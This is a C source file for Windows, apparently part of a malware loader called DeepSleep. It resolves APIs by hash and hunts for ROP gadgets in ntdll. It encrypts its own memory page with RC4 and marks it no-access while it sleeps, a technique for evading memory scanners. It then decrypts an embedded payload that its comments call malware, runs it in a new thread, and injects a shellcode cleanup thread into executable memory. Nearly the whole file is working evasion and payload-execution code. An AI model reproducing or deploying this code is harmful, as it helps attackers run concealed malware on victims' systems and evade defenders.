#include <windows.h>
#include "stdio.h"

#include "ApiResolve.h"
#include "Cleanup.h"

#define FAIL 0
#define SUCCESS 1
#define KEY_SIZE 11

BOOL findGadget(byte pattern[], DWORD dwLenPattern, PVOID* ppGadgetAddress);
BOOL generateRandomKey(wchar_t charArray[KEY_SIZE], CRYPTACQUIRECONTEXTW _CryptAcquireContext, CRYPTGENRANDOM _CryptGenRandom, CRYPTRELEASECONTEXT _CryptReleaseContext);

extern DWORD64 GetRIP(void);
extern BOOL DeepSleep(LPVOID, SIZE_T, DWORD, PDWORD, PKEY, PCRYPT_BUFFER, PVOID, PVOID, PVOID, PVOID, PVOID, DWORD);


// Main function for DeepSleep
int go(LPVOID malwarePage, SIZE_T malwareSize){

    // Main imports
    GETSYSTEMINFO _GetSystemInfo = (GETSYSTEMINFO)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_GETSYSTEMINFO);
    VIRTUALQUERYEX _VirtualQueryEx = (VIRTUALQUERYEX)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_VIRTUALQUERYEX);
    GETCURRENTPROCESS _GetCurrentProcess = (GETCURRENTPROCESS)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_GETCURRENTPROCESS);
    VIRTUALPROTECT _VirtualProtect = (VIRTUALPROTECT)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_VIRTUALPROTECT);
    CREATETHREAD _CreateThread = (CREATETHREAD)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_CREATETHREAD);
    SLEEP _Sleep = (SLEEP)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_SLEEP);


    // For payload
    VIRTUALALLOC _VirtualAlloc = (VIRTUALALLOC)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYTPED_HASH_VIRTUALALLOC);
    VIRTUALFREE _VirtualFree = (VIRTUALFREE)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_VIRTUALFREE);
    COPYMEMORY _CopyMemory = (COPYMEMORY)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_COPYMEMORY);
    SLEEP2 _Sleep2 = (SLEEP2)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_SLEEP);

    // For encryption
    SYSTEMFUNCTION032 _SystemFunction032 = (SYSTEMFUNCTION032)getFunctionPtr(CRYPTED_HASH_ADVAPI, CRYPTED_HASH_SYSTEMFUNCTION032);
    CRYPTACQUIRECONTEXTW _CryptAcquireContextW = (CRYPTACQUIRECONTEXTW)getFunctionPtr(CRYPTED_HASH_ADVAPI, CRYPTED_HASH_CRYPTACQUIRECONTEXTW);
    CRYPTRELEASECONTEXT _CryptReleaseContext = (CRYPTRELEASECONTEXT)getFunctionPtr(CRYPTED_HASH_ADVAPI, CRYPTED_HASH_CRYPTRELEASECONTEXT);
    CRYPTGENRANDOM _CryptGenRandom = (CRYPTGENRANDOM)getFunctionPtr(CRYPTED_HASH_ADVAPI, CRYPTED_HASH_CRYPTGENRANDOM);


    DWORD dwSuccess = FAIL, dwOldProtect = 0;
    PVOID rip = NULL, gAddRsp32 = NULL, gSuper = NULL;

    PVOID myPage = NULL;
    DWORD myPageLength = 0;

    MEMORY_BASIC_INFORMATION mbi = { 0x00 };
    SYSTEM_INFO si = { 0x00 };
    BOOL bFound = FALSE;

    byte patternSuperGadget[] = { 0x5A, 0x59, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x41, 0x5B, 0xC3 };
    byte patternAddRsp32Pop[] = { 0x48, 0x83, 0xC4, 0x20, 0x41, 0x5E, 0xC3 };

    bFound = findGadget(patternSuperGadget, 11, &gSuper);
    if (bFound == FALSE)
        goto exit;

    bFound = findGadget(patternAddRsp32Pop, 5, &gAddRsp32);
    if (bFound == FALSE)
        goto exit;

    rip = (PVOID)GetRIP();
    _GetSystemInfo(&si);
  
    LPVOID lpMem = 0;
   
    while (lpMem < si.lpMaximumApplicationAddress) {

        _VirtualQueryEx(_GetCurrentProcess(), lpMem, &mbi, sizeof(MEMORY_BASIC_INFORMATION));

        if (rip >= mbi.BaseAddress && (DWORD64)rip <= (DWORD64)mbi.BaseAddress + mbi.RegionSize) {

            myPage = mbi.BaseAddress;
            myPageLength = mbi.RegionSize;
 
            break;
        }

        lpMem = (LPVOID)((DWORD64)mbi.BaseAddress + mbi.RegionSize);

    }

    wchar_t keybuffer[KEY_SIZE];
    CRYPT_BUFFER myPageBuffer;
    myPageBuffer.Buffer = (PVOID)myPage;
    myPageBuffer.Length = myPageLength;
    myPageBuffer.MaximumLength = myPageLength;
    int flag = 0;
    while (flag == 0) {

        // Generate random encrypt key
        
        // We send the functions imported instead of importing there to avoid calling getFunctionPtr every time
       if (!generateRandomKey(keybuffer, _CryptAcquireContextW, _CryptGenRandom, _CryptReleaseContext)) {
            goto exit;
        }
        KEY myKey;
        myKey.Buffer = (PVOID)(keybuffer);
        myKey.Length = KEY_SIZE;
        myKey.MaximumLength = KEY_SIZE;
        
        // Sleep
        DeepSleep(myPage, // rdx
            myPageLength, // rcx
            PAGE_NOACCESS, // r8
            &dwOldProtect, // r9
            &myKey, // stack 30h
            &myPageBuffer, // stack 38h
            gSuper, // stack 40h
            gAddRsp32, // stack 48h
            _Sleep, // stack 50h
            _SystemFunction032, // stack 58h
            _VirtualProtect, // stack 60h
            20000 // stack 68h
        );

        // Perform check
        
        flag = 1;
    }

    wchar_t key[] = L"[$faiusne3";
    DWORD oldProtect;
    // Virtual protect malware so we can decrypt
    if (!_VirtualProtect(malwarePage, malwareSize, PAGE_READWRITE, &oldProtect)) {
        goto exit;
    }
    CRYPT_BUFFER payloadData;
    payloadData.Buffer = malwarePage;
    payloadData.Length = malwareSize;
    payloadData.MaximumLength = malwareSize;

    KEY payloadKey;
    payloadKey.Buffer = key;
    payloadKey.Length = KEY_SIZE;
    payloadKey.MaximumLength = KEY_SIZE;

    // Decrypt malware
    _SystemFunction032((PVOID)&payloadData, (PVOID)&payloadKey);

    // Virtual protect malware so we can run it
    _VirtualProtect(malwarePage, malwareSize, PAGE_EXECUTE_READ, &oldProtect);
    
    SECURITY_ATTRIBUTES s;
    SecureZeroMemory(&s, sizeof(s));

    // Run malware
    _CreateThread(&s, 0, malwarePage, NULL, 0, NULL);

    //-- Inject deleter thread
    // Setup parameters for thread
    struct CleanupParams params;
    SecureZeroMemory(&params, sizeof(params));
    params.myPage = myPage;
    params.myPageLength = myPageLength;
    params.virtualFree = _VirtualFree;
    params.sleep = _Sleep2;
    params.virtualProtect = _VirtualProtect;

    // Allocate memory for cleanup thread parameters
    LPVOID allocatedParams = _VirtualAlloc(0, sizeof(struct CleanupParams), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    _CopyMemory(allocatedParams, &params, sizeof(struct CleanupParams));

    // Calculate allocation size for cleanup function (Position independent shellcode)
    const SIZE_T cleanupBytesSize = (DWORD64)CleanupEnd - (DWORD64)Cleanup;

    // Allocate memory for cleanup thread parameters
    PVOID allocatedCleanup = _VirtualAlloc(0, cleanupBytesSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    _CopyMemory(allocatedCleanup, Cleanup, cleanupBytesSize);

    // Create cleanup thread and exit immediately
    SECURITY_ATTRIBUTES s2;
    SecureZeroMemory(&s2, sizeof(s2));

    // Run cleanup thread
    _CreateThread(&s2, 0, (LPTHREAD_START_ROUTINE)allocatedCleanup, allocatedParams, 0, NULL);
    dwSuccess = SUCCESS;

exit:

    return dwSuccess;

}

BOOL findGadget(byte pattern[], DWORD dwLenPattern, PVOID* ppGadgetAddress) {

    VIRTUALALLOC _VirtualAlloc = (VIRTUALALLOC)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYTPED_HASH_VIRTUALALLOC);
    VIRTUALFREE _VirtualFree = (VIRTUALFREE)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_VIRTUALFREE);
    COPYMEMORY _CopyMemory = (COPYMEMORY)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_COPYMEMORY);
    GETMODULEHANDLE _GetModuleHandle = (GETMODULEHANDLE)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_GETMODULEHANDLEA);
    LSTRCMPA _lstrcmpA = (LSTRCMPA)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_LSTRCMPA);

    BOOL bSuccess = FALSE;
    PVOID pBufTextMemory = NULL;
    DWORD sizeText = 0;

    PIMAGE_DOS_HEADER pDosHdr = NULL;
    PIMAGE_NT_HEADERS pNtHdrs = NULL;
    PIMAGE_SECTION_HEADER pSectionHdr = NULL;
    HMODULE hNtdll = NULL;

    char ntdll[] = { 'n', 't', 'd','l','l','.', 'd','l','l', 0x00 };
    char text[] = { '.', 't','e','x','t', 0x00 };

    hNtdll = _GetModuleHandle(ntdll);
    if (hNtdll == NULL)
        goto exit;

    pDosHdr = (PIMAGE_DOS_HEADER)hNtdll;
    pNtHdrs = (PIMAGE_NT_HEADERS)((byte*)hNtdll + pDosHdr->e_lfanew);
    pSectionHdr = (PIMAGE_SECTION_HEADER)((byte*)&pNtHdrs->OptionalHeader + sizeof(IMAGE_OPTIONAL_HEADER));

    for (int i = 0; i < pNtHdrs->FileHeader.NumberOfSections; i++) {

        if (_lstrcmpA((char*)pSectionHdr->Name, text) == 0) {

            pBufTextMemory = _VirtualAlloc(0, pSectionHdr->Misc.VirtualSize, MEM_COMMIT, PAGE_READWRITE);
            if (pBufTextMemory == NULL)
                goto exit;

            _CopyMemory(pBufTextMemory, (byte*)((byte*)hNtdll + pSectionHdr->VirtualAddress), pSectionHdr->Misc.VirtualSize);

            sizeText = pSectionHdr->Misc.VirtualSize;

            break;

        }

        pSectionHdr = (PIMAGE_SECTION_HEADER)((byte*)pSectionHdr + sizeof(IMAGE_SECTION_HEADER));

    }

    if (pBufTextMemory == NULL)
        goto exit;

    BOOL bFound = FALSE;
    int i = 0;
    for (i = 0; i < sizeText && bFound == FALSE; i++) {
        for (int j = 0; j < dwLenPattern; j++) {
            if (* ((byte*)pBufTextMemory + i + j) != pattern[j]) {
                bFound = FALSE;
                break;
            } else {
                bFound = TRUE;
            }
        }
    }

    if (bFound == FALSE)
        goto exit;

    *ppGadgetAddress = (byte*)hNtdll + pSectionHdr->VirtualAddress + i - 1;

    bSuccess = TRUE;

exit:

    if (pBufTextMemory)
        _VirtualFree(pBufTextMemory, 0, MEM_RELEASE);

    return bSuccess;

}

BOOL generateRandomKey(wchar_t charArray[KEY_SIZE], CRYPTACQUIRECONTEXTW _CryptAcquireContext, CRYPTGENRANDOM _CryptGenRandom, CRYPTRELEASECONTEXT _CryptReleaseContext) {
    HCRYPTPROV hCryptProv;
    if (_CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        if (_CryptGenRandom(hCryptProv, KEY_SIZE, (BYTE*)charArray)) {
            return TRUE;
        }
        _CryptReleaseContext(hCryptProv, 0);
    }
    return FALSE;
}
